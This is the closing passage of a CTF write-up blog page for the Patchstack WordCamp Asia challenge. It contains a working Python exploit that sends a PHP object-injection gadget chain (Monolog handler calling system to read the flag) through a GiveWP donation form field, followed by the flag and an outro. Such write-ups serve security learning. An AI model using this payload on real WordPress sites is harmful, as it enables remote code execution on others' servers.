+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>unquote</span><span class=p>,</span> <span class=n>quote</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>re</span> <span class=kn>import</span> <span class=n>search</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://52.77.81.199:9140/?givewp-route=donate&amp;givewp-route-signature=7be844822138dbd619d31db7e8b9cf02&amp;givewp-route-signature-id=givewp-donate&amp;givewp-route-signature-expiration=1740489610&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.9&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>popGadget</span> <span class=o>=</span> <span class=n>unquote</span><span class=p>(</span><span class=s2>&#34;O%3A37%3A%22Monolog%5CHandler%5CFingersCrossedHandler</span><span class=si>%22%</span><span class=s2>3A4%3A%7Bs%3A16%3A</span><span class=si>%22%</span><span class=s2>00%2A%00passthruLevel</span><span class=si>%22%</span><span class=s2>3Bi%3A0%3Bs%3A10%3A</span><span class=si>%22%</span><span class=s2>00%2A</span><span class=si>%00ha</span><span class=s2>ndler</span><span class=si>%22%</span><span class=s2>3Br%3A1%3Bs%3A9%3A</span><span class=si>%22%</span><span class=s2>00%2A%00buffer</span><span class=si>%22%</span><span class=s2>3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Bs%3A7%3A</span><span class=si>%22c</span><span class=s2>at</span><span class=si>%20%</span><span class=s2>2Ff%2A</span><span class=si>%22%</span><span class=s2>3Bs%3A5%3A</span><span class=si>%22le</span><span class=s2>vel</span><span class=si>%22%</span><span class=s2>3Bi%3A0%3B%7D%7Ds%3A13%3A</span><span class=si>%22%</span><span class=s2>00%2A%00processors</span><span class=si>%22%</span><span class=s2>3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22pos</span><span class=si>%22%</span><span class=s2>3Bi%3A1%3Bs%3A6%3A</span><span class=si>%22s</span><span class=s2>ystem</span><span class=si>%22%</span><span class=s2>3B%7D%7D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>emoji</span> <span class=o>=</span> <span class=n>quote</span><span class=p>(</span><span class=s2>&#34;😼&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>popGadget</span> <span class=o>=</span> <span class=n>popGadget</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;:&#34;</span> <span class=o>+</span> <span class=n>emoji</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>popGadget</span> <span class=o>=</span> <span class=n>popGadget</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;N;&#34;</span><span class=p>,</span> <span class=s2>&#34;N&#34;</span> <span class=o>+</span> <span class=n>emoji</span> <span class=o>+</span> <span class=s2>&#34;;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Multipart form-data payload</span>
+</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;amount&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;currency&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;USD&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;donationType&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;single&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;formId&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;9&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;gatewayId&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;manual&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;firstName&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=n>popGadget</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;lastName&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;b&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;aa@gmail.com&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;comment&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;donationBirthday&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;originUrl&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;http://52.77.81.199:9140/?give_forms=givewp-donation-form&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;isEmbed&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;true&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;embedId&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;9&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;gatewayData[testGatewayIntent]&#34;</span><span class=p>:</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;test-gateway-intent&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>match</span> <span class=o>=</span> <span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;CTF\{.*?\}&#34;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>match</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Found:&#34;</span><span class=p>,</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No flag found.&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Flag Obtained!
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-48.png width=1115 height=802 loading=lazy class=gallery-image data-flex-grow=139 data-flex-basis=333px></p><p><strong>Flag: CTF{g1v3_plug1n_keeps_g1v1ng_php_0bj3ct_1njection}</strong></p><hr><h2 id=outro>Outro</h2><p>Patchstack CTF is getting harder in every iteration, but never getting out of unique ideas. I really love the concept of WordPress CTF challenges where i can improve my skills in wordpress hacking and also web hacking in general. I hope Patchstack will always keep with the good challenges. Kudos to all challenge authors and participant. See you on the next CTF 🔥🔥</p></section><footer class=article-footer><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>Last updated on Feb 24, 2025 13:44 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/htb-ctf-university-2024-intergalactic-bounty/><div class=article-image><img src=/p/htb-ctf-university-2024-intergalactic-bounty/banner.cb6b9b6329d9b3060480b9a7549b9c78.png width=1248 height=572 loading=lazy alt="Featured image of post [HTB CTF University 2024] - Intergalactic Bounty" data-hash="md5-y2ubYynZswYEgLmnVJuceA=="></div><div class=article-details><h2 class=article-title>[HTB CTF University 2024] - Intergalactic Bounty</h2></div></a></article><article class=has-image><a href=/p/htb-ctf-university-2024-breaking-bank/><div class=article-image><img src=/p/htb-ctf-university-2024-breaking-bank/banner.5cf0d74574ce974ba0b775f386fdeff9.png width=1371 height=639 loading=lazy alt="Featured image of post [HTB CTF University 2024] - Breaking Bank" data-hash="md5-XPDXRXTOl0ugt3Xzhv3v+Q=="></div><div class=article-details><h2 class=article-title>[HTB CTF University 2024] - Breaking Bank</h2></div></a></article><article class=has-image><a href=/p/htb-ctf-university-2024-armaxis/><div class=article-image><img src=/p/htb-ctf-university-2024-armaxis/banner.1201673f134374b06fea79bb65fe84be.png width=1130 height=419 loading=lazy alt="Featured image of post [HTB CTF University 2024] - Armaxis" data-hash="md5-EgFnPxNDdLBv6nm7Zf6Evg=="></div><div class=article-details><h2 class=article-title>[HTB CTF University 2024] - Armaxis</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2025 lordrukie</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
